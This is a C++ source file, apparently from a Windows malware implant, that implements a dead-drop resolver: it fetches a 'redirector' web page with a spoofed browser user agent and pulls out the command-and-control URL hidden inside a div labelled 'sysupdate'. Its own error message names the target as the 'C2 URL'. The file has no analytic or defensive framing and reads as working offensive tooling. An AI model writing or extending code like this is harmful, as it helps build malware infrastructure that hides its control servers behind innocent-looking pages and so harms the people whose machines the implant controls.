#include "RedirectorResolver.h"
#include "WinHttpClient.h"
#include "../core/Config.h"
#include <regex>
#include <stdexcept>
#include <urlmon.h>

namespace http {

RedirectorResolver::RedirectorResolver(const std::string& redirectorUrl) : redirectorUrl_(redirectorUrl) {}

std::string RedirectorResolver::resolve() {
    std::wstring wideRedirectorUrl(redirectorUrl_.begin(), redirectorUrl_.end());
    URL_COMPONENTSW urlComp;
    wchar_t serverName[256];
    wchar_t path[256];

    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = serverName;
    urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);

    if (!WinHttpCrackUrl(wideRedirectorUrl.c_str(), wideRedirectorUrl.length(), 0, &urlComp)) {
        throw std::runtime_error("Failed to crack redirector URL.");
    }

    WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
    std::string html = client.get(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath));

    std::regex divRegex("<div[^>]+id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>", std::regex::icase);
    std::smatch match;
    if (!std::regex_search(html, match, divRegex)) {
        throw std::runtime_error("C2 URL not found in redirector page.");
    }

    std::string content = match[1].str();
    std::regex urlRegex("https?://[^\\s\"'<>]+");
    if (std::regex_search(content, match, urlRegex)) {
        return match[0].str();
    }

    throw std::runtime_error("No valid URL found in sysupdate div.");
}

} // namespace http
